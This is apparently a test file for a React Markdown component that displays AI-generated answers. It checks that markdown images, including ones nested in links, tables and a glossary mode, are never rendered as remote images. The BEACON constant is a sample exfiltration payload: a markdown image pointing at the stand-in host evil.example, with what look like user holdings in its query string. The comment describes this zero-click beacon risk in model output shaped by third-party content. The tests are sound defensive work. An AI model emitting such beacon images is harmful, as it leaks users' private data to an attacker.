import { describe, expect, it } from "vitest";
import { createElement, type ComponentProps } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown from "./Markdown";

// Answers are model text shaped by third-party content, so a remote image in one
// is a zero-click beacon. These pin that no markdown path ever emits an <img>.
const BEACON = "![chart](https://evil.example/p.png?h=AAPL:10:150;MSFT:5:300)";

function render(md: string, glossary = false): string {
  const props = { glossary } as ComponentProps<typeof Markdown>;
  return renderToStaticMarkup(createElement(Markdown, props, md));
}

describe("Markdown image handling", () => {
  it("never renders a remote image, and names its host instead", () => {
    const html = render(`Here is the chart:\n\n${BEACON}`);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example/p.png");
    expect(html).toContain("[image: chart · evil.example]");
  });

  it("covers the glossary component map used for beginner readers", () => {
    const html = render(`Revenue grew.\n\n${BEACON}`, true);
    expect(html).not.toContain("<img");
  });

  it("covers images nested inside links and tables", () => {
    const html = render(
      `[${BEACON}](https://example.com)\n\n| a |\n|---|\n| ${BEACON} |`
    );
    expect(html).not.toContain("<img");
  });

  it("still renders ordinary links", () => {
    const html = render("[source](https://www.sec.gov/)");
    expect(html).toContain('href="https://www.sec.gov/"');
    expect(html).toContain('rel="noopener noreferrer"');
  });
});
